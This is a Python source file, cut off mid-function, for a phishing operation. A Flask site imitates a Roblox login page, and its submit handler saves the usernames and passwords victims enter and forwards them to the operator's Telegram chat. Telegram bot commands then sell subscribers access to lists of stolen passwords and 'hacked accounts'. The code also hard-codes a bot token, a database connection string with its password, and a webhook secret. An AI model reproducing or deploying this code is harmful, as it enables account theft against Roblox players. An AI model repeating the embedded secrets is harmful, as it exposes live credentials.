# Импорт библиотек
from flask import Flask, request, abort, render_template
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
import logging
import json
from datetime import datetime, timedelta
from functools import wraps
from ratelimit import limits, sleep_and_retry
import hashlib
import secrets
import ipaddress
import re
import uuid
import retrying

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Инициализация Flask
app = Flask(__name__, template_folder='templates')

# Конфигурация
TOKEN = '8028944732:AAFsvb4csGSRwtmEFYLGbnTKsCq1hOH6rm0'
ADMIN_CHAT_ID = '6956377285'
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')
SECRET_WEBHOOK_TOKEN = '98pOXgZq1JMVhHYU9646rpBQl5nvwNXUzvR_WOpV34s'

# Инициализация бота
try:
    bot = telebot.TeleBot(TOKEN)
    logger.info("Бот успешно инициализирован")
except Exception as e:
    logger.error(f"Ошибка инициализации бота: {e}")
    raise

# Глобальные переменные
processed_updates = set()
tech_mode = False
tech_reason = ""
tech_end_time = None
ad_keywords = [
    'подписка', 'заработок', 'реклама', 'продвижение', 'бесплатно',
    'акция', 'промо', 'скидка', 'casino', 'bet', 'казино', 'ставки',
    'деньги', 'инвестиции', 'бонус'
]
TELEGRAM_IP_RANGES = [
    ipaddress.IPv4Network('149.154.160.0/20'),
    ipaddress.IPv4Network('91.108.4.0/22')
]
CALLS = 100
PERIOD = 60

# Хэширование данных
def hash_data(data):
    logger.debug(f"Хэширование: {data}")
    return hashlib.sha256(str(data).encode()).hexdigest()

# Проверка IP Telegram
def is_telegram_ip(ip):
    logger.info(f"Проверка IP: {ip}")
    try:
        client_ip = ipaddress.ip_address(ip)
        for network in TELEGRAM_IP_RANGES:
            if client_ip in network:
                logger.info(f"IP {ip} — Telegram")
                return True
        logger.warning(f"IP {ip} не Telegram")
        return False
    except ValueError:
        logger.error(f"Неверный IP: {ip}")
        return False

# Ограничение частоты запросов
@sleep_and_retry
@limits(calls=CALLS, period=PERIOD)
def rate_limited_endpoint(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        logger.debug(f"Лимит для {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

# Текущее время (UTC+2)
def get_current_time():
    logger.debug("Запрос времени")
    return datetime.now() + timedelta(hours=2)

# Форматирование времени
def format_time(dt):
    if not dt:
        return "Не указано"
    return dt.strftime("%Y-%m-%d %H:%M:%S")

# Подключение к базе с повторными попытками
@retrying.retry(stop_max_attempt_number=3, wait_fixed=2000)
def get_db_connection():
    logger.info("Подключение к базе")
    try:
        conn = psycopg2.connect(DATABASE_URL)
        logger.info("База подключена")
        return conn
    except Exception as e:
        logger.error(f"Ошибка подключения: {e}")
        raise

# Инициализация базы
def init_db():
    logger.info("Инициализация базы")
    try:
        conn = get_db_connection()
        if conn is None:
            logger.error("База недоступна")
            return False
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                chat_id TEXT PRIMARY KEY,
                prefix TEXT,
                subscription_end TEXT,
                username TEXT,
                last_activity TEXT,
                ip_hash TEXT
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                login TEXT PRIMARY KEY,
                password TEXT,
                added_time TEXT,
                added_by TEXT
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS hacked_accounts (
                login TEXT PRIMARY KEY,
                password TEXT,
                hack_date TEXT,
                prefix TEXT,
                sold_status TEXT,
                linked_chat_id TEXT
            )
        ''')
        subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
        logger.info(f"Добавление Создателя: {ADMIN_CHAT_ID}")
        c.execute(
            '''
            INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
            VALUES (%s, %s, %s, %s, %s, %s)
            ON CONFLICT (chat_id) DO UPDATE
            SET prefix = EXCLUDED.prefix,
                subscription_end = EXCLUDED.subscription_end,
                last_activity = EXCLUDED.last_activity,
                ip_hash = EXCLUDED.ip_hash,
                username = EXCLUDED.username
            ''',
            (ADMIN_CHAT_ID, "Создатель", subscription_end, get_current_time().isoformat(), hash_data(ADMIN_CHAT_ID), "@sacoectasy")
        )
        conn.commit()
        logger.info("База готова")
        return True
    except Exception as e:
        logger.error(f"Ошибка инициализации: {e}")
        return False
    finally:
        if conn:
            conn.close()

# Поддержание активности
def keep_alive():
    logger.info("Запуск keep_alive")
    while True:
        try:
            response = requests.get(SITE_URL, timeout=10)
            logger.debug(f"Пинг {SITE_URL}: {response.status_code}")
        except Exception as e:
            logger.error(f"Ошибка keep_alive: {e}")
        time.sleep(60)

# Получение данных пользователя
def get_user(chat_id):
    logger.info(f"Запрос данных: {chat_id}")
    try:
        conn = get_db_connection()
        if conn is None:
            if chat_id == ADMIN_CHAT_ID:
                logger.info("Админ без базы")
                return {
                    'prefix': 'Создатель',
                    'subscription_end': (get_current_time() + timedelta(days=3650)).isoformat(),
                    'last_activity': get_current_time().isoformat(),
                    'ip_hash': hash_data(chat_id),
                    'username': '@sacoectasy'
                }
            logger.warning("База недоступна")
            return None
        c = conn.cursor()
        c.execute(
            "SELECT prefix, subscription_end, last_activity, ip_hash, username FROM users WHERE chat_id = %s",
            (chat_id,)
        )
        result = c.fetchone()
        if result:
            logger.info(f"Пользователь {chat_id} найден")
            return {
                'prefix': result[0],
                'subscription_end': result[1],
                'last_activity': result[2],
                'ip_hash': result[3],
                'username': result[4]
            }
        logger.info(f"Пользователь {chat_id} не найден")
        return None
    except Exception as e:
        logger.error(f"Ошибка данных: {e}")
        return None
    finally:
        if conn:
            conn.close()

# Сохранение пользователя
def save_user(chat_id, prefix, subscription_end=None, ip=None, username=None):
    logger.info(f"Сохранение: {chat_id}")
    try:
        conn = get_db_connection()
        if conn is None:
            logger.error("База недоступна")
            return
        c = conn.cursor()
        subscription_end = subscription_end or get_current_time().isoformat()
        ip_hash = hash_data(ip or chat_id)
        last_activity = get_current_time().isoformat()
        c.execute(
            '''
            INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
            VALUES (%s, %s, %s, %s, %s, %s)
            ON CONFLICT (chat_id) DO UPDATE
            SET prefix = EXCLUDED.prefix,
                subscription_end = EXCLUDED.subscription_end,
                last_activity = EXCLUDED.last_activity,
                ip_hash = EXCLUDED.ip_hash,
                username = EXCLUDED.username
            ''',
            (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
        )
        conn.commit()
        logger.info(f"Пользователь {chat_id} сохранён")
    except Exception as e:
        logger.error(f"Ошибка сохранения: {e}")
    finally:
        if conn:
            conn.close()

# Проверка доступа
def check_access(chat_id, command):
    global tech_mode, tech_end_time
    logger.info(f"Проверка: {chat_id} для {command}")
    user = get_user(chat_id)
    
    # ТехПомощник и Создатель имеют доступ ко всем командам даже во время техперерыва
    if user and user['prefix'] in ['Создатель', 'ТехПомощник']:
        logger.debug(f"{user['prefix']} {chat_id} имеет полный доступ")
        return None
    
    # Проверка техперерыва для остальных
    if tech_mode and chat_id != ADMIN_CHAT_ID:
        end_time_str = format_time(tech_end_time)
        logger.warning(f"Тех. режим: {chat_id}")
        return (
            f"🛠 *Бот на техническом перерыве!*\n"
            f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
            f"🕒 *Окончание*: {end_time_str}\n"
            f"Попробуйте позже."
        )
    
    if user is None:
        if command in ['start', 'menu', 'support']:
            logger.info(f"Регистрация {chat_id} для {command}")
            return None
        logger.warning(f"Нет доступа: {chat_id}, {command}")
        return "💳 *Купить подписку у @sacoectasy!*"
    
    try:
        subscription_end = datetime.fromisoformat(user['subscription_end']) if user['subscription_end'] else get_current_time()
        if subscription_end < get_current_time():
            logger.info(f"Подписка истекла: {chat_id}")
            save_user(chat_id, 'Посетитель', get_current_time().isoformat(), chat_id, user['username'])
            return "💳 *Подписка истекла! Обратитесь к @sacoectasy.*"
    except ValueError:
        logger.error(f"Неверный формат subscription_end для {chat_id}")
        return "❌ *Ошибка данных подписки!*"
    
    if user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'support']:
            logger.debug(f"Разрешён {command} для Посетителя")
            return None
        logger.warning(f"Запрещён {command} для Посетителя")
        return "💳 *Купить подписку у @sacoectasy!*"
    
    # Общие команды для подписчиков
    if command in ['passwords', 'hacked', 'getchatid', 'site', 'contact']:
        logger.debug(f"Разрешён {command}")
        return None
    
    # Админ-команды
    if command in ['database', 'viewdb']:
        if user['prefix'] in ['Админ', 'Создатель', 'ТехПомощник']:
            logger.debug(f"Разрешён {command} для {user['prefix']}")
            return None
    
    # Команды только для Создателя и ТехПомощника
    if command in ['techstop', 'techstopoff', 'adprefix', 'delprefix', 'adduser', 'addcred', 'addhacked', 'broadcast', 'admin', 'messageuser']:
        if user['prefix'] not in ['Создатель', 'ТехПомощник']:
            logger.warning(f"Запрещена команда {command} для {chat_id}")
            return "🔒 *Эта команда только для Создателя или ТехПомощника!*"
    
    logger.debug(f"Разрешён {command}")
    return None

# Очистка ввода
def sanitize_input(text):
    if not text:
        return ""
    dangerous_chars = [';', '--', '/*', '*/', 'DROP', 'SELECT', 'INSERT', 'UPDATE', 'DELETE']
    text = text.strip()
    for char in dangerous_chars:
        text = text.replace(char, '')
    logger.debug(f"Очищен: {text}")
    return text

# Список пользователей
def get_all_users():
    logger.info("Запрос пользователей")
    try:
        conn = get_db_connection()
        if conn is None:
            logger.error("База недоступна")
            return []
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, username FROM users")
        users = c.fetchall()
        logger.info(f"Найдено {len(users)} пользователей")
        return users
    except Exception as e:
        logger.error(f"Ошибка пользователей: {e}")
        return []
    finally:
        if conn:
            conn.close()

# Проверка статуса бота
def check_bot_status():
    logger.info("Проверка статуса")
    try:
        bot.get_me()
        logger.info("Бот активен")
        return True
    except Exception as e:
        logger.error(f"Бот не отвечает: {e}")
        return False

# Маршруты Flask
@app.route('/', endpoint='index')
def index():
    logger.info("Запрос на /")
    return render_template('index.html')

@app.route('/404', endpoint='not_found')
def not_found():
    logger.info("Запрос на /404")
    return render_template('404.html')

@app.route('/toptrending', endpoint='top_trending')
def top_trending():
    logger.info("Запрос на /toptrending")
    return render_template('toptrending.html')

@app.route('/login-roblox', endpoint='login_roblox')
def login_roblox():
    logger.info("Запрос на /login-roblox")
    return render_template('login-roblox.html')

@app.route('/index', endpoint='index_explicit')
def index_explicit():
    logger.info("Запрос на /index")
    return render_template('index.html')

@app.route('/upandcoming', endpoint='up_and_coming')
def up_and_coming():
    logger.info("Запрос на /upandcoming")
    return render_template('upandcoming.html')

@app.route('/funwithfriends', endpoint='fun_with_friends')
def fun_with_friends():
    logger.info("Запрос на /funwithfriends")
    return render_template('funwithfriends.html')

@app.route('/hotrightnow', endpoint='hot_right_now')
def hot_right_now():
    logger.info("Запрос на /hotrightnow")
    return render_template('hotrightnow.html')

@app.route('/toprevisted', endpoint='top_revisited')
def top_revisited():
    logger.info("Запрос на /toprevisted")
    return render_template('toprevisted.html')

# Обработчик формы логина
@app.route('/submit', methods=['POST'])
def submit_login():
    logger.info("Обработка формы логина")
    try:
        login = sanitize_input(request.form.get('login'))
        password = sanitize_input(request.form.get('password'))
        if not login or not password:
            logger.warning("Пустой логин или пароль")
            return render_template('login-roblox.html', error="Логин и пароль обязательны")
        
        conn = get_db_connection()
        if conn is None:
            logger.error("База недоступна")
            return render_template('login-roblox.html', error="Ошибка сервера")
        
        try:
            c = conn.cursor()
            c.execute(
                '''
                INSERT INTO credentials (login, password, added_time, added_by)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (login) DO NOTHING
                ''',
                (login, password, get_current_time().isoformat(), "web_form")
            )
            conn.commit()
            logger.info(f"Сохранено: {login}")
        except Exception as e:
            logger.error(f"Ошибка сохранения: {e}")
            return render_template('login-roblox.html', error="Ошибка сохранения данных")
        finally:
            if conn:
                conn.close()
        
        try:
            bot.send_message(
                ADMIN_CHAT_ID,
                f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
                parse_mode='Markdown'
            )
            logger.info("Данные отправлены в Telegram")
        except Exception as e:
            logger.error(f"Ошибка Telegram: {e}")
        
        return render_template('login-roblox.html', success="Данные успешно отправлены")
    except Exception as e:
        logger.error(f"Ошибка формы: {e}")
        return render_template('login-roblox.html', error="Произошла ошибка")

# Обработчик 404
@app.errorhandler(404)
def page_not_found(e):
    logger.info(f"404 ошибка: {request.path}")
    return render_template('404.html'), 404

# Вебхук
@app.route('/webhook', methods=['POST'])
@rate_limited_endpoint
def webhook():
    logger.info("Запрос на /webhook")
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in client_ip:
        client_ip = client_ip.split(',')[0].strip()
    if not is_telegram_ip(client_ip):
        logger.warning(f"Чужой IP: {client_ip}")
        abort(403)
    secret_token = request.headers.get('X-Telegram-Bot-Api-Secret-Token')
    if secret_token != SECRET_WEBHOOK_TOKEN:
        logger.warning(f"Неверный токен: {secret_token}")
        abort(403)
    if request.headers.get('content-type') != 'application/json':
        logger.warning("Неверный content-type")
        abort(400)
    try:
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        if not update or not (update.message or update.callback_query):
            logger.debug("Пустое обновление")
            return 'OK', 200
        update_id = update.update_id
        if update_id in processed_updates:
            logger.info(f"Повтор: {update_id}")
            return 'OK', 200
        processed_updates.add(update_id)
        logger.info(f"Обработка: {update_id}")
        threading.Thread(target=bot.process_new_updates, args=([update],)).start()
        return 'OK', 200
    except Exception as e:
        logger.error(f"Ошибка вебхука: {e}")
        return 'OK', 200

# /start
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/start от {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /start: {e}")
        return
    response = (
        "🌟 *Добро пожаловать в бота!*\n"
        "Здесь вы найдёте эксклюзивные функции и данные.\n"
        "🔍 Используйте /menu для просмотра доступных команд."
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user is None:
            save_user(chat_id, "Посетитель", get_current_time().isoformat(), str(message.from_user.id), username)
        else:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /start: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /menu
@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/menu от {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /menu: {e}")
        return
    user = get_user(chat_id)
    if user is None:
        save_user(chat_id, "Посетитель", get_current_time().isoformat(), str(message.from_user.id), username)
        user = get_user(chat_id)
    prefix = user['prefix']
    tech_status = (
        f"🛠 *Техперерыв активен*\n"
        f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
        f"🕒 *Окончание*: {format_time(tech_end_time)}"
    ) if tech_mode else "✅ *Техперерыв отключён*"
    response = (
        f"📋 *Главное меню*\n"
        f"👤 *Ваш статус*: `{prefix}`\n"
        f"🕒 *Статус бота*: {tech_status}\n\n"
        f"🔥 *Доступные команды*:\n"
        f"📖 /menu — Показать это меню\n"
        f"📩 /support — Связаться с поддержкой\n"
    )
    if prefix != "Посетитель":
        response += (
            f"🆔 /getchatid — Узнать ваш ID\n"
            f"🌐 /site — Ссылка на наш сайт\n"
            f"🔑 /passwords — Просмотр паролей\n"
            f"💻 /hacked — Взломанные аккаунты\n"
            f"📞 /contact — Связаться с пользователем\n"
        )
    if prefix in ["Админ", "Создатель", "ТехПомощник"]:
        response += (
            f"🗄 /database — Управление базой данных\n"
            f"🔍 /viewdb — Просмотр базы данных\n"
        )
    if prefix in ["Создатель", "ТехПомощник"]:
        response += (
            f"🔧 /admin — Панель администратора\n"
            f"🚨 /techstop — Включить техперерыв\n"
            f"✅ /techstopoff — Выключить техперерыв\n"
            f"📢 /broadcast — Отправить рассылку\n"
            f"👑 /adprefix — Выдать подписку\n"
            f"🗑 /delprefix — Сбросить подписку\n"
            f"➕ /adduser — Добавить пользователя\n"
            f"🔐 /addcred — Добавить пароль\n"
            f"💾 /addhacked — Добавить взломанный аккаунт\n"
            f"💬 /messageuser — Отправить сообщение пользователю\n"
        )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /menu: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /messageuser — Новая команда для Создателя
@bot.message_handler(commands=['messageuser'])
def messageuser_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/messageuser от {chat_id}")
    access = check_access(chat_id, 'messageuser')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /messageuser: {e}")
        return
    users = get_all_users()
    if not users:
        try:
            bot.reply_to(message, "📭 *Нет пользователей для отправки сообщения!*", parse_mode='Markdown')
            logger.info("Нет пользователей")
        except Exception as e:
            logger.error(f"Ошибка /messageuser: {e}")
        return
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    for user_id, prefix, user_name in users:
        if user_id == chat_id:
            continue  # Пропускаем самого Создателя
        user_name = user_name or "Неизвестно"
        keyboard.add(
            types.InlineKeyboardButton(
                f"@{user_name} ({prefix})",
                callback_data=f"msguser_{user_id}"
            )
        )
    try:
        bot.reply_to(
            message,
            "👥 *Выберите пользователя для отправки сообщения*:",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        logger.info("Показан список пользователей")
    except Exception as e:
        logger.error(f"Ошибка /messageuser: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('msguser_'))
def handle_messageuser_select(call):
    chat_id = str(call.message.chat.id)
    target_id = call.data.replace('msguser_', '')
    logger.info(f"Выбор пользователя {target_id} от {chat_id}")
    try:
        msg = bot.send_message(
            chat_id,
            f"📝 *Введите сообщение для пользователя {target_id}*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, lambda m: process_messageuser_message(m, target_id))
        bot.answer_callback_query(call.id)
        logger.info(f"Запрошено сообщение для {target_id}")
    except Exception as e:
        logger.error(f"Ошибка выбора: {e}")
        bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

def process_messageuser_message(message, target_id):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Сообщение для {target_id}: {text}")
    if not text:
        try:
            bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустое сообщение")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        user = get_user(chat_id)
        sender_name = user['username'] or "Создатель"
        bot.send_message(
            target_id,
            f"📩 *Сообщение от Создателя (@{sender_name})*:\n{text}",
            parse_mode='Markdown'
        )
        bot.reply_to(
            message,
            f"✅ *Сообщение отправлено пользователю {target_id}!*",
            parse_mode='Markdown'
        )
        logger.info(f"Сообщение отправлено {target_id}")
    except Exception as e:
        logger.error(f"Ошибка отправки: {e}")
        bot.reply_to(message, "❌ *Ошибка отправки сообщения!*", parse_mode='Markdown')

# /getchatid
@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/getchatid от {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /getchatid: {e}")
        return
    response = (
        f"🆔 *Ваш идентификатор*\n"
        f"🔢 *Chat ID*: `{chat_id}`\n"
        f"👤 *Юзернейм*: @{username}"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /getchatid: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /support
@bot.message_handler(commands=['support'])
def support_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/support от {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /support: {e}")
        return
    response = (
        "📩 *Нужна помощь?*\n"
        "Опишите вашу проблему, и мы передадим её в поддержку!"
    )
    try:
        msg = bot.reply_to(message, response, parse_mode='Markdown')
        bot.register_next_step_handler(msg, lambda m: process_support_message(m, username))
        logger.info(f"Запрошена поддержка от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /support: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_support_message(message, username):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Поддержка от {chat_id}: {text}")
    if not text:
        try:
            bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустое сообщение")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            f"📩 *Сообщение в поддержку*\n👤 *От*: {chat_id} (@{username})\n📜 *Текст*: {text}",
            parse_mode='Markdown'
        )
        bot.reply_to(message, "✅ *Ваше сообщение отправлено в поддержку!*", parse_mode='Markdown')
        logger.info(f"Поддержка отправлена")
    except Exception as e:
        logger.error(f"Ошибка отправки: {e}")
        bot.reply_to(message, "❌ *Ошибка при отправке! Попробуйте позже.*", parse_mode='Markdown')

# /site
@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/site от {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /site: {e}")
        return
    response = "🌐 *Наш официальный сайт*: https://tg-bod.onrender.com"
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /site: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /hacked
@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/hacked от {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /hacked: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ *База данных недоступна! Попробуйте позже.*", parse_mode='Markdown')
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
        accounts = c.fetchall()
        response = "💻 *Взломанные аккаунты*\n\n" if accounts else "📭 *Список взломанных аккаунтов пуст.*\n"
        for login, password, status, hack_date in accounts:
            response += (
                f"🔑 *Логин*: `{login}`\n"
                f"🔒 *Пароль*: `{password}`\n"
                f"📊 *Статус*: {status}\n"
                f"🕒 *Добавлено*: {hack_date or 'Неизвестно'}\n\n"
            )
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /hacked: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке данных!*", parse_mode='Markdown')
    finally:
        if conn:
            conn.close()

# /passwords
@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/passwords от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /passwords: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ *База данных недоступна! Попробуйте позже.*", parse_mode='Markdown')
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        credentials = c.fetchall()
        response = "🔑 *Список паролей*\n\n" if credentials else "📭 *Список паролей пуст.*\n"
        for login, password, added_time in credentials:
            response += (
                f"🔐 *Логин*: `{login}`\n"
                f"🔒 *Пароль*: `{password}`\n"
                f"🕒 *Добавлено*: {added_time or 'Неизвестно'}\n\n"
            )
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton("➕ Добавить в hacked", callback_data="add_to_hacked")
        )
        if user and user['prefix'] in ["Админ", "Создатель", "ТехПомощник"]:
            keyboard.add(
                types.InlineKeyboardButton("🗑 Удалить пароль", callback_data="delete_cred")
            )
        bot.send_message(
            chat_id,
            "⚙️ *Выберите действие*:",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"Ответ: {response}")
    except Exception as e:
        logger.error(f"Ошибка /passwords: {e}")
        bot.reply_to(message, "❌ *Ошибка при загрузке данных!*", parse_mode='Markdown')
    finally:
        if conn:
            conn.close()

# Обработчик кнопок для /passwords
@bot.callback_query_handler(func=lambda call: call.data in ['add_to_hacked', 'delete_cred'])
def handle_passwords_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, access, parse_mode='Markdown')
            logger.warning(f"Доступ запрещён")
        except Exception as e:
            logger.error(f"Ошибка кнопки: {e}")
        return
    user = get_user(chat_id)
    if not user:
        try:
            bot.answer_callback_query(call.id)
            bot.send_message(chat_id, "❌ *Пользователь не найден!*", parse_mode='Markdown')
            logger.warning(f"Пользователь не найден: {chat_id}")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    if call.data == 'add_to_hacked':
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            try:
                bot.answer_callback_query(call.id)
                bot.send_message(chat_id, "🔒 *Добавление в hacked только для админов!*", parse_mode='Markdown')
                logger.warning(f"Не админ: {chat_id}")
            except Exception as e:
                logger.error(f"Ошибка add_to_hacked: {e}")
            return
        try:
            msg = bot.send_message(chat_id, "📝 *Введите логин для добавления в hacked*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_hacked_login)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошен логин")
        except Exception as e:
            logger.error(f"Ошибка add_to_hacked: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
    elif call.data == 'delete_cred':
        if user['prefix'] not in ['Админ', 'Создатель', 'ТехПомощник']:
            try:
                bot.answer_callback_query(call.id)
                bot.send_message(chat_id, "🔒 *Удаление паролей только для админов!*", parse_mode='Markdown')
                logger.warning(f"Не админ: {chat_id}")
            except Exception as e:
                logger.error(f"Ошибка delete_cred: {e}")
            return
        try:
            msg = bot.send_message(chat_id, "📝 *Введите логин для удаления*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_delete_cred)
            bot.answer_callback_query(call.id)
            logger.info(f"Запрошено удаление")
        except Exception as e:
            logger.error(f"Ошибка delete_cred: {e}")
            bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')

def process_hacked_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин: {login} от {chat_id}")
    if not login:
        try:
            bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
